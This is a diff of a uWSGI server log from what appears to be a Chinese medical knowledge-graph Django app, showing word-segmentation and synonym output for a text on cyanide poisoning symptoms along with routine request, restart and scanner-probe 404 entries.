-Model loaded succeed [['氰化物', 'n'], ['(', 'w'], ['cyanide', 'x'], [')', 'w'], ['为', 'p'], ['含有', 'v'], ['氰基', 'n'], ['的', 'u'], ['化合物', 'n'], ['是', 'v'], ['剧毒物', 'n'], ['，', 'w'], ['包括', 'v'], ['氰化氢', 'n'], ['、', 'w'], ['氰化钠', 'n'], ['、', 'w'], ['氰化钾', 'n'], ['，', 'w'], ['氰化铵', 'n'], ['和', 'c'], ['丙烯腈', 'n'], ['等', 'u'], ['。', 'w'], ['氰化物中毒', 'uw'], ['是', 'v'], ['氰化物', 'n'], ['通过', 'p'], ['皮肤', 'n'], ['、', 'w'], ['呼吸道', 'n'], ['或', 'c'], ['消化道', 'n'], ['进入', 'v'], ['体内', 's'], ['所', 'u'], ['致', 'v'], ['。', 'w'], ['一', 'm'], ['般', 'q'], ['氰化物中毒', 'uw'], ['分为', 'v'], ['四', 'm'], ['期', 'q'], ['分别', 'd'], ['是', 'v'], ['1', 'j'], ['.', 'w'], ['前驱期吸入者', 'n'], ['表现', 'v'], ['为', 'v'], ['眼', 'n'], ['和', 'c'], ['上', 'v'], ['呼吸道', 'n'], ['刺激', 'v'], ['症状', 'n'], ['，', 'w'], ['口服', 'v'], ['中毒者', 'n'], ['表现', 'v'], ['为', 'v'], ['恶心', 'a'], ['呕吐', 'uw'], ['腹泻', 'v'], ['等', 'u'], ['。', 'w'], ['2', 'm'], ['.', 'w'], ['呼吸困难', 'uw'], ['期胸部', 'n'], ['紧缩感', 'n'], ['，', 'w'], ['呼吸困难', 'uw'], ['，', 'w'], ['皮肤', 'n'], ['黏膜', 'n'], ['呈', 'v'], ['樱桃', 'n'], ['红色', 'n'], ['。', 'w'], ['3', 'm'], ['.', 'w'], ['惊', 'g'], ['厥期', 'd'], ['出现', 'v'], ['强直性', 'n'], ['或', 'c'], ['阵发性', 'n'], ['痉挛', 'v'], ['，', 'w'], ['甚至', 'c'], ['角弓反张', 'uw'], ['，', 'w'], ['大小便失禁', 'uw'], ['。', 'w'], ['4', 'm'], ['.', 'w'], ['麻痹期', 'n'], ['如', 'c'], ['不', 'd'], ['及时', 'a'], ['抢救', 'v'], ['，', 'w'], ['患者', 'n'], ['全身', 'n'], ['肌肉', 'n'], ['松弛', 'a'], ['，', 'w'], ['反射', 'v'], ['消失', 'v'], ['，', 'w'], ['昏迷', 'v'], ['，', 'w'], ['血压', 'n'], ['骤降', 'v'], ['，', 'w'], ['很快', 'd'], ['呼吸', 'v'], ['先', 'd'], ['于', 'p'], ['心跳', 'v'], ['停止', 'v'], ['而', 'c'], ['死亡', 'v'], ['。', 'w'], ['氰化物中毒', 'uw'], ['的', 'u'], ['病人', 'n'], ['呼气', 'v'], ['有', 'v'], ['特殊', 'a'], ['的', 'u'], ['苦杏', 'n'], ['仁味', 'n'], ['。', 'w'], ['若', 'c'], ['吸入', 'v'], ['高浓度', 'a'], ['氰化氢', 'n'], ['气体', 'n'], ['或', 'c'], ['吞服', 'v'], ['致', 'v'], ['死', 'v'], ['剂量', 'n'], ['的', 'u'], ['氰化钠', 'n'], ['或', 'c'], ['氰化钾', 'n'], ['后', 'f'], ['可', 'v'], ['引起', 'v'], ['猝死', 'v'], ['。', 'w']]
-
-------end------
-------start------
-[connect success] | ip : 39.108.111.94
-result:
-smart_open library not found; falling back to local-filesystem-only >> Synonyms load wordseg dict [/usr/local/lib/python3.5/site-packages/synonyms/data/vocab.txt] ... >> Synonyms on loading stopwords [/usr/local/lib/python3.5/site-packages/synonyms/data/stopwords.txt] ... >> Synonyms on loading vectors [/usr/local/lib/python3.5/site-packages/synonyms/data/words.vector] ... {'消化道': ['消化道', '肠道', '肠胃', '胃肠道', '小肠', '消化系统', '肾脏', '十二指肠', '呼吸道', '大肠'], '刺激': ['刺激', '性刺激', '抑制', '兴奋', '焦虑', '诱发', '激发', '冲动', '诱导', '诱因'], '呕吐': ['呕吐', '腹泻', '呼吸困难', '腹痛', '头痛', '咳嗽', '恶心', '痉挛', '抽搐', '发烧'], '黏膜': ['黏膜', '粘膜', '表皮', '皮肤', '发炎', '上皮细胞', '水肿', '口腔', '肺部', '呼吸道'], '丙烯腈': ['丙烯腈', '苯乙烯', '聚丙烯', '氰基', '乙基', '乙烯基', '重氮', '丙烷', '乙烯', 'N-'], '吸入': ['吸入', '排出', '喷出', '窒息', '粉尘', '有毒', '排泄', '呼吸道', '高热', '诱发'], '苦杏': [], '患者': ['患者', '病人', '病患', '症状', '病症', '患儿', '病患者', '病征', '病变', '高血压'], '包括': ['包括', '还包括', '包含', '都有', '最主要', '仅限于', '以外', '除此以外', '之外', '有数'], '痉挛': ['痉挛', '疼痛', '抽搐', '呕吐', '头痛', '咳嗽', '病症', '癫痫', '呼吸困难', '高血压'], '而': [], '肌肉': ['肌肉', '四肢', '身体', '关节', '神经', '下肢', '脊柱', '躯干', '手部', '肌肉组织'], '剂量': ['剂量', '口服', 'mg', '浓度', '副作用', '血糖', '低剂量', '静脉注射', '药物', '施打'], '(': [], '上': [], '氰化氢': ['氰化氢', '氰化物', '有毒', '化学物质', '剧毒', '甲醛', '自燃', '苯甲酸', '乙二醇', '硝酸盐'], '若': [], '骤降': ['骤降', '急剧下降', '急降', '骤减', '持续上升', '激增', '剧减', '剧增', '渐增', '有所增加'], '症状': ['症状', '病症', '病征', '征状', '患者', '副作用', '疼痛', '腹泻', '呕吐', '病因'], '通过': [], '1': [], '分为': ['分为', '分成', '分作', '细分', '分别为', '划分', '包含', '统称', '总称', '可分'], '眼': ['眼', '双眼', '斑', '眼睛', '红斑', '眼眶', '晕', '海马', '暗', '白点'], '反射': ['反射', '光线', '折射', '反射光', '照射', '散射', '入射', '太阳光', '透射', '叠加'], '特殊': ['特殊', '类似', '相同', '多种不同', '类似于', '特别', '一般来说', '特殊性', '独有', '比如说'], '氰化钠': ['氰化钠', '氢氰酸', '硫化氢', '草酸', '甲醇', '氰酸', '二氧化硫', '苯酚', '自燃', '氰化'], '氰化物': ['氰化物', '解毒剂', '氰化氢', '药剂', '毒药', '剧毒', '有毒', '氰化钾', '氟化物', '氰化'], '或': [], '紧缩感': [], '氰化铵': [], '麻痹期': [], '呼吸困难': ['呼吸困难', '呕吐', '咳嗽', '头痛', '剧痛', '痉挛', '头晕', '发烧', '晕眩', '腹痛'], '惊': ['惊', '怒', '狂', '叹', '啼', '笑', '恨', '泣', '奈何', '痴'], '，': [], '可': [], '口服': ['口服', '静脉注射', '抗生素', '本品', '药物', '用药', '制剂', '低剂量', '施打', '吗啡'], '含有': ['含有', '所含', '含', '富含', '成分', '内含', '成份', '包含', '掺入', '带有'], '===': [], '等': [], '氰化物中毒': [], '。': [], '表现': ['表现', '展现出', '发挥', '体现', '展现', '展示出', '显出', '乏善可陈', '平庸', '观感'], '四': [], '中毒者': ['中毒者', '中毒', '征状', '呕吐', '黄疸', '昏睡', '昏厥', '肾衰竭', '胃痛', '施用'], '有': [], '腹泻': ['腹泻', '呕吐', '腹痛', '咳嗽', '发烧', '病症', '过敏', '高血压', '消化不良', '头痛'], '期胸部': [], '气体': ['气体', '氢气', '液体', '氮气', '微粒', '空气', '气态', '二氧化碳', '水蒸气', '液态'], '呼气': ['呼气', '呼吸', '排便', '喉头', '气管', '麻醉', '汗液', '间歇', '食道', '吸管'], '很快': ['很快', '迅速', '不久', '便', '立刻', '之后', '马上', '刚刚', '慢慢地', '再一'], '4': [], '2': [], '心跳': ['心跳', '跳动', '发烧', '心律不整', '脸红', '颤抖', '昏厥', '发热', '腹痛', '流汗'], '吞服': [], '致': [], 'cyanide': [], '般': [], ')': [], '分别': [], '血压': ['血压', '血糖', '体温', '高血压', '心率', '眼压', '心血管', '皮质醇', '肝功能', '腹水'], '大小便失禁': [], '呼吸': ['呼吸', '排便', '吞咽', '换气', '排尿', '肺部', '气管', '新陈代谢', '痉挛', '颤动'], '樱桃': ['樱桃', '草莓', '枫树', '核桃', '菠萝', '黄杨', '橙', '桂花', '柚子', '雏菊'], '呈': ['呈', '呈圆形', '椭圆形', '红褐色', '长方形', '圆形', '方形', '深褐色', '排列成', '黄绿色'], '出现': ['出现', '经常出现', '消失', '再次出现', '浮现', '注意到', '用到', '显现出来', '显现', '显现出'], '仁味': [], '氰基': ['氰基', '苯基', '丙烷', '乙烯', '芳基', '重氮', '卤代烃', '丙酮', '亚胺', '烯丙基'], '病人': ['病人', '患者', '病患', '治疗', '病者', '医护人员', '病患者', '病症', '产妇', '病童'], '死亡': ['死亡', '丧生', '失踪', '丧命', '致死', '幸存者', '生还', '遇害', '死亡者', '被害'], '甚至': [], '先': ['先', '再行', '再', '可先', '先行', '先以', '不须', '到时', '必先', '先为'], '及时': ['及时', '第一时间', '立即', '及早', '适时', '即时', '马上', '设法', '立刻', '幸而'], '进入': ['进入', '转入', '离开', '踏入', '转到', '转回', '重回', '进到', '转至', '带入'], '如': [], '和': [], '、': [], '昏迷': ['昏迷', '昏倒', '昏迷不醒', '醒来', '晕倒', '不省人事', '送医', '苏醒', '体力不支', '失忆'], '3': [], '恶心': ['恶心', '呕吐', '头痛', '舒服', '羞耻', '焦虑', '烦躁', '麻木', '眩晕', '白痴'], '于': [], '剧毒物': [], '前驱期吸入者': [], '所': [], '是': [], '强直性': [], '为': [], '阵发性': [], '期': [], '全身': ['全身', '身体', '身躯', '上半身', '脸部', '四肢', '浑身', '胸部', '手脚', '下半身'], '红色': ['红色', '黄色', '白色', '蓝色', '橙色', '紫色', '黑色', '粉红色', '金色', '深蓝色'], '的': [], '抢救': ['抢救', '救治', '急救', '抢救无效', '救人', '送医', '救助', '疗伤', '受困', '幸而'], '猝死': ['猝死', '心脏病发', '离世', '暴毙', '发作', '中风', '心脏病', '心肌梗塞', '突发', '身故'], '一': [], '不': [], '呼吸道': ['呼吸道', '肺部', '呼吸系统', '消化道', '发炎', '细菌感染', '黏膜', '口腔', '溃疡', '肠胃'], '.': [], '角弓反张': [], '松弛': ['松弛', '肿胀', '放松', '肥大', '有规律', '间歇', '持续性', '经年累月', '</s>', 'Pardosa'], '皮肤': ['皮肤', '皮肤上', '表皮', '毛发', '肌肤', '黏膜', '眼部', '指甲', '脸部', '面部'], '厥期': [], '消失': ['消失', '消亡', '消退', '变成', '遗忘', '绝迹', '消逝', '变为', '销声匿迹', '不复存在'], '氰化钾': ['氰化钾', '氰化物', '毒药', '三氧化二砷', '剧毒', '解毒剂', '氰化氢', '苯甲酸', '氰化', '据称'], '停止': ['停止', '暂停', '中止', '终止', '中断', '取消', '暂时中止', '停顿', '暂时', '暂缓'], '死': ['死', '杀', '死去', '亡', '临死', '至死', '临死前', '惨死', '活着', '临终时'], '高浓度': [], '化合物': ['化合物', '有机化合物', '衍生物', '氧化物', '阴离子', '硫', '锂', '氟化物', '中间体', '氟化'], '体内': ['体内', '人体内', '血液', '细胞内', '精子', '体外', '毒素', '肝细胞', '体液', '母体'], '引起': ['引起', '引发', '引来', '激起', '招致', '惹来', '造成', '导致', '造成了', '引致'], '后': []}
-
-------end------
-[pid: 9971|app: 0|req: 21/21] 124.160.57.70 () {52 vars in 1100 bytes} [Sat Apr 20 13:20:39 2019] POST /views/distinguish/getDistinguishData/ => generated 9753 bytes in 24354 msecs (HTTP/1.1 200) 3 headers in 116 bytes (1 switches on core 0)
-[uwsgi-python-reloader] module/file ./toolkit/nlp/NER.py has been modified
+[pid: 11272|app: 0|req: 2/4] 124.160.57.70 () {44 vars in 978 bytes} [Mon Apr 22 05:32:00 2019] GET /views/myDoctor/?id=1 => generated 21459 bytes in 316 msecs (HTTP/1.1 200) 5 headers in 293 bytes (1 switches on core 1)
+[pid: 11272|app: 0|req: 3/5] 124.160.57.70 () {44 vars in 1050 bytes} [Mon Apr 22 05:32:04 2019] GET /doctor/getDoctorAndPingjia?doctorId=YS19032701 => generated 0 bytes in 1 msecs (HTTP/1.1 301) 3 headers in 153 bytes (1 switches on core 0)
+集合已存在！
+集合已存在！
+[pid: 11272|app: 0|req: 4/6] 124.160.57.70 () {44 vars in 1052 bytes} [Mon Apr 22 05:32:04 2019] GET /doctor/getDoctorAndPingjia/?doctorId=YS19032701 => generated 6903 bytes in 33 msecs (HTTP/1.1 200) 5 headers in 292 bytes (1 switches on core 1)
+[pid: 11272|app: 0|req: 5/7] 124.160.57.70 () {44 vars in 1036 bytes} [Mon Apr 22 05:32:08 2019] GET /doctor/getQiuzhu?qiuzhuId=qz19041700000 => generated 0 bytes in 1 msecs (HTTP/1.1 301) 3 headers in 146 bytes (1 switches on core 0)
+集合已存在！
+集合已存在！
+集合已存在！
+集合已存在！
+[pid: 11271|app: 0|req: 3/8] 124.160.57.70 () {44 vars in 1038 bytes} [Mon Apr 22 05:32:08 2019] GET /doctor/getQiuzhu/?qiuzhuId=qz19041700000 => generated 4008 bytes in 67 msecs (HTTP/1.1 200) 4 headers in 124 bytes (1 switches on core 0)
+[pid: 11271|app: 0|req: 4/9] 124.160.57.70 () {44 vars in 1048 bytes} [Mon Apr 22 05:32:17 2019] GET /views/myDoctor/pingjia?qiuzhuId=qz19041700000 => generated 0 bytes in 2 msecs (HTTP/1.1 301) 3 headers in 152 bytes (1 switches on core 1)
+集合已存在！
+集合已存在！
+集合已存在！
+集合已存在！
+集合已存在！
+[pid: 11272|app: 0|req: 6/10] 124.160.57.70 () {44 vars in 1050 bytes} [Mon Apr 22 05:32:17 2019] GET /views/myDoctor/pingjia/?qiuzhuId=qz19041700000 => generated 4263 bytes in 46 msecs (HTTP/1.1 200) 5 headers in 292 bytes (1 switches on core 0)
+[pid: 11272|app: 0|req: 7/11] 124.160.57.70 () {44 vars in 986 bytes} [Mon Apr 22 05:57:37 2019] GET /views/interlocution?id=1 => generated 0 bytes in 1 msecs (HTTP/1.1 301) 3 headers in 131 bytes (1 switches on core 1)
+[pid: 11271|app: 0|req: 5/12] 124.160.57.70 () {44 vars in 988 bytes} [Mon Apr 22 05:57:37 2019] GET /views/interlocution/?id=1 => generated 4082 bytes in 4 msecs (HTTP/1.1 200) 3 headers in 110 bytes (1 switches on core 0)
+[pid: 11271|app: 0|req: 6/13] 124.160.57.70 () {44 vars in 969 bytes} [Mon Apr 22 05:57:43 2019] GET /accounts/logout => generated 0 bytes in 2 msecs (HTTP/1.1 301) 3 headers in 122 bytes (1 switches on core 1)
+数据库已存在！
+create neo4j class ...
+connect succeed
+数据库已存在！
+[pid: 11273|app: 0|req: 1/14] 124.160.57.70 () {44 vars in 971 bytes} [Mon Apr 22 05:57:43 2019] GET /accounts/logout/ => generated 0 bytes in 845 msecs (HTTP/1.1 302) 5 headers in 223 bytes (1 switches on core 0)
+[pid: 11272|app: 0|req: 8/15] 124.160.57.70 () {44 vars in 925 bytes} [Mon Apr 22 05:57:44 2019] GET /accounts/login/ => generated 5358 bytes in 10 msecs (HTTP/1.1 200) 5 headers in 292 bytes (1 switches on core 0)
+Mon Apr 22 05:57:44 2019 - *** /root/MHKG/Django has been touched... grace them all !!! ***
 ...gracefully killing workers...
-Gracefully killing worker 1 (pid: 9968)...
-Gracefully killing worker 2 (pid: 9969)...
-Gracefully killing worker 3 (pid: 9970)...
-Gracefully killing worker 4 (pid: 9971)...
+Gracefully killing worker 1 (pid: 11270)...
+Gracefully killing worker 2 (pid: 11271)...
+Gracefully killing worker 4 (pid: 11273)...
+Gracefully killing worker 3 (pid: 11272)...
 worker 1 buried after 1 seconds
-worker 2 buried after 1 seconds
-worker 3 buried after 1 seconds
-worker 4 buried after 1 seconds
+worker 2 buried after 2 seconds
+worker 3 buried after 2 seconds
+worker 4 buried after 2 seconds
 binary reloading uWSGI...
 chdir() to /root/MHKG/Django
 closing all non-uwsgi socket fds > 2 (max_fd = 100001)...
 found fd 3 mapped to socket 0 (127.0.0.1:8000)
 running /usr/local/bin/uwsgi
 [uWSGI] getting INI configuration from uwsgi.ini
-*** Starting uWSGI 2.0.18 (64bit) on [Sat Apr 20 13:23:58 2019] ***
+*** Starting uWSGI 2.0.18 (64bit) on [Mon Apr 22 05:57:46 2019] ***
 compiled with version: 8.3.0 on 16 March 2019 06:35:56
 os: Linux-3.10.0-862.el7.x86_64 #1 SMP Fri Apr 20 16:44:24 UTC 2018
 nodename: VM_0_13_centos
@@ -801,7 +312,7 @@ uwsgi socket 0 inherited INET address 127.0.0.1:8000 fd 3
 uWSGI running as root, you can use --uid/--gid/--chroot options
 *** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
 Python version: 3.7.0 (default, Mar 16 2019, 10:29:00)  [GCC 4.8.5 20150623 (Red Hat 4.8.5-36)]
-Python main interpreter initialized at 0x15341c0
+Python main interpreter initialized at 0x1d9e1c0
 uWSGI running as root, you can use --uid/--gid/--chroot options
 *** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
 python threads support enabled
@@ -809,23 +320,230 @@ your server socket listen backlog is limited to 100 connections
 your mercy for graceful operations on workers is 60 seconds
 mapped 416880 bytes (407 KB) for 8 cores
 *** Operational MODE: preforking+threaded ***
-WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x15341c0 pid: 19822 (default app)
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x1d9e1c0 pid: 19822 (default app)
 uWSGI running as root, you can use --uid/--gid/--chroot options
 *** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
 *** uWSGI is running in multiple interpreter mode ***
 gracefully (RE)spawned uWSGI master process (pid: 19822)
-spawned uWSGI worker 1 (pid: 27522, cores: 2)
-spawned uWSGI worker 2 (pid: 27523, cores: 2)
-spawned uWSGI worker 3 (pid: 27524, cores: 2)
-spawned uWSGI worker 4 (pid: 27525, cores: 2)
+spawned uWSGI worker 1 (pid: 13545, cores: 2)
+spawned uWSGI worker 2 (pid: 13546, cores: 2)
+spawned uWSGI worker 3 (pid: 13547, cores: 2)
+spawned uWSGI worker 4 (pid: 13548, cores: 2)
 Python auto-reloader enabled
+数据库已存在！
+create neo4j class ...
+connect succeed
+数据库已存在！
+[pid: 13546|app: 0|req: 1/1] 124.160.57.70 () {42 vars in 842 bytes} [Mon Apr 22 05:57:47 2019] GET /accounts/login/code.jpg => generated 1121 bytes in 1076 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 0)
+[pid: 13546|app: 0|req: 2/2] 124.160.57.70 () {42 vars in 857 bytes} [Mon Apr 22 05:57:48 2019] GET / => generated 12678 bytes in 12 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 1)
+数据库已存在！
+create neo4j class ...
+connect succeed
+数据库已存在！
+273====10
+{'title': '补气理气的七种家常食物', 'abstract': '很多人经常有头晕、心悸、面色苍白、易流汗的症状，这都需要补气理气。以下小编推荐补气理气的七种家常食物。', 'url': 'https://ys.99.com.cn/diaoyang/582354.htm'}
+[pid: 13548|app: 0|req: 1/3] 124.160.57.70 () {44 vars in 923 bytes} [Mon Apr 22 05:57:48 2019] GET /views/console/ => generated 13408 bytes in 1376 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+[pid: 13548|app: 0|req: 2/4] 124.160.57.70 () {44 vars in 935 bytes} [Mon Apr 22 05:57:52 2019] GET /views/interlocution/ => generated 4095 bytes in 3 msecs (HTTP/1.1 200) 3 headers in 110 bytes (1 switches on core 1)
 [uwsgi-python-reloader] module/file ./Django/settings.py has been modified
 ...gracefully killing workers...
+Gracefully killing worker 1 (pid: 13545)...
+Gracefully killing worker 2 (pid: 13546)...
+Gracefully killing worker 3 (pid: 13547)...
+Gracefully killing worker 4 (pid: 13548)...
 [uwsgi-python-reloader] module/file ./Django/settings.py has been modified
-Gracefully killing worker 1 (pid: 27522)...
-Gracefully killing worker 2 (pid: 27523)...
-Gracefully killing worker 3 (pid: 27524)...
-Gracefully killing worker 4 (pid: 27525)...
+worker 1 buried after 1 seconds
+worker 2 buried after 1 seconds
+worker 3 buried after 1 seconds
+worker 4 buried after 1 seconds
+binary reloading uWSGI...
+chdir() to /root/MHKG/Django
+closing all non-uwsgi socket fds > 2 (max_fd = 100001)...
+found fd 3 mapped to socket 0 (127.0.0.1:8000)
+running /usr/local/bin/uwsgi
+[uWSGI] getting INI configuration from uwsgi.ini
+*** Starting uWSGI 2.0.18 (64bit) on [Mon Apr 22 05:58:06 2019] ***
+compiled with version: 8.3.0 on 16 March 2019 06:35:56
+os: Linux-3.10.0-862.el7.x86_64 #1 SMP Fri Apr 20 16:44:24 UTC 2018
+nodename: VM_0_13_centos
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /root/MHKG/Django
+detected binary path: /usr/local/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /root/MHKG/Django
+your processes number limit is 7272
+your memory page size is 4096 bytes
+detected max file descriptor number: 100001
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 inherited INET address 127.0.0.1:8000 fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.7.0 (default, Mar 16 2019, 10:29:00)  [GCC 4.8.5 20150623 (Red Hat 4.8.5-36)]
+Python main interpreter initialized at 0x25201c0
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 416880 bytes (407 KB) for 8 cores
+*** Operational MODE: preforking+threaded ***
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x25201c0 pid: 19822 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+gracefully (RE)spawned uWSGI master process (pid: 19822)
+spawned uWSGI worker 1 (pid: 13629, cores: 2)
+spawned uWSGI worker 2 (pid: 13630, cores: 2)
+spawned uWSGI worker 3 (pid: 13631, cores: 2)
+spawned uWSGI worker 4 (pid: 13632, cores: 2)
+Python auto-reloader enabled
+Mon Apr 22 06:08:22 2019 - *** /root/MHKG/Django has been touched... grace them all !!! ***
+...gracefully killing workers...
+Gracefully killing worker 1 (pid: 13629)...
+Gracefully killing worker 2 (pid: 13630)...
+Gracefully killing worker 3 (pid: 13631)...
+Gracefully killing worker 4 (pid: 13632)...
+worker 1 buried after 1 seconds
+worker 2 buried after 1 seconds
+worker 3 buried after 1 seconds
+worker 4 buried after 1 seconds
+binary reloading uWSGI...
+chdir() to /root/MHKG/Django
+closing all non-uwsgi socket fds > 2 (max_fd = 100001)...
+found fd 3 mapped to socket 0 (127.0.0.1:8000)
+running /usr/local/bin/uwsgi
+[uWSGI] getting INI configuration from uwsgi.ini
+*** Starting uWSGI 2.0.18 (64bit) on [Mon Apr 22 06:08:23 2019] ***
+compiled with version: 8.3.0 on 16 March 2019 06:35:56
+os: Linux-3.10.0-862.el7.x86_64 #1 SMP Fri Apr 20 16:44:24 UTC 2018
+nodename: VM_0_13_centos
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /root/MHKG/Django
+detected binary path: /usr/local/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /root/MHKG/Django
+your processes number limit is 7272
+your memory page size is 4096 bytes
+detected max file descriptor number: 100001
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 inherited INET address 127.0.0.1:8000 fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.7.0 (default, Mar 16 2019, 10:29:00)  [GCC 4.8.5 20150623 (Red Hat 4.8.5-36)]
+Python main interpreter initialized at 0x137f1c0
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 416880 bytes (407 KB) for 8 cores
+*** Operational MODE: preforking+threaded ***
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x137f1c0 pid: 19822 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+gracefully (RE)spawned uWSGI master process (pid: 19822)
+spawned uWSGI worker 1 (pid: 14686, cores: 2)
+spawned uWSGI worker 2 (pid: 14687, cores: 2)
+spawned uWSGI worker 3 (pid: 14688, cores: 2)
+spawned uWSGI worker 4 (pid: 14689, cores: 2)
+Python auto-reloader enabled
+数据库已存在！
+create neo4j class ...
+connect succeed
+数据库已存在！
+[pid: 14689|app: 0|req: 1/1] 172.104.108.109 () {34 vars in 390 bytes} [Mon Apr 22 06:11:49 2019] GET / => generated 12678 bytes in 1083 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+[pid: 14689|app: 0|req: 2/2] 183.129.198.99 () {34 vars in 442 bytes} [Mon Apr 22 06:21:18 2019] GET / => generated 12678 bytes in 3 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 1)
+Not Found: /index.action
+[pid: 14689|app: 0|req: 3/3] 183.129.198.99 () {34 vars in 2185 bytes} [Mon Apr 22 06:21:18 2019] GET /index.action => generated 10973 bytes in 18 msecs (HTTP/1.1 404) 3 headers in 103 bytes (1 switches on core 0)
+[pid: 14689|app: 0|req: 4/4] 124.41.214.42 () {32 vars in 459 bytes} [Mon Apr 22 06:25:21 2019] GET / => generated 12678 bytes in 2 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 1)
+Not Found: /phpMyAdmin/scripts/setup.php
+[pid: 14689|app: 0|req: 5/5] 58.251.121.184 () {38 vars in 670 bytes} [Mon Apr 22 06:28:17 2019] GET /phpMyAdmin/scripts/setup.php => generated 11021 bytes in 8 msecs (HTTP/1.1 404) 3 headers in 103 bytes (1 switches on core 0)
+Not Found: /manager/html
+[pid: 14689|app: 0|req: 6/6] 183.129.198.99 () {36 vars in 507 bytes} [Mon Apr 22 06:46:46 2019] GET /manager/html => generated 10973 bytes in 7 msecs (HTTP/1.1 404) 3 headers in 103 bytes (1 switches on core 1)
+SIGINT/SIGQUIT received...killing workers...
+worker 1 buried after 1 seconds
+worker 2 buried after 1 seconds
+worker 3 buried after 1 seconds
+*** Starting uWSGI 2.0.18 (64bit) on [Mon Apr 22 15:19:18 2019] ***
+compiled with version: 8.3.0 on 16 March 2019 06:35:56
+os: Linux-3.10.0-862.el7.x86_64 #1 SMP Fri Apr 20 16:44:24 UTC 2018
+nodename: VM_0_13_centos
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /root/MHKG/Django
+writing pidfile to logs/uwsgi.pid
+detected binary path: /usr/local/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /root/MHKG/Django
+your processes number limit is 7272
+your memory page size is 4096 bytes
+detected max file descriptor number: 100001
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+probably another instance of uWSGI is running on the same address (127.0.0.1:8000).
+bind(): Address already in use [core/socket.c line 769]
+worker 4 buried after 2 seconds
+goodbye to uWSGI.
+*** Starting uWSGI 2.0.18 (64bit) on [Mon Apr 22 15:19:31 2019] ***
+compiled with version: 8.3.0 on 16 March 2019 06:35:56
+os: Linux-3.10.0-862.el7.x86_64 #1 SMP Fri Apr 20 16:44:24 UTC 2018
+nodename: VM_0_13_centos
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /root/MHKG/Django
+writing pidfile to logs/uwsgi.pid
+detected binary path: /usr/local/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /root/MHKG/Django
+your processes number limit is 7272
+your memory page size is 4096 bytes
+detected max file descriptor number: 100001
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to TCP address 127.0.0.1:8000 fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.7.0 (default, Mar 16 2019, 10:29:00)  [GCC 4.8.5 20150623 (Red Hat 4.8.5-36)]
+Python main interpreter initialized at 0x175b8a0
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 416880 bytes (407 KB) for 8 cores
+*** Operational MODE: preforking+threaded ***
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x175b8a0 pid: 21719 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 21719)
+spawned uWSGI worker 1 (pid: 21725, cores: 2)
+spawned uWSGI worker 2 (pid: 21726, cores: 2)
+spawned uWSGI worker 3 (pid: 21727, cores: 2)
+spawned uWSGI worker 4 (pid: 21732, cores: 2)
+Python auto-reloader enabled
+数据库已存在！
+create neo4j class ...
+connect succeed
+数据库已存在！
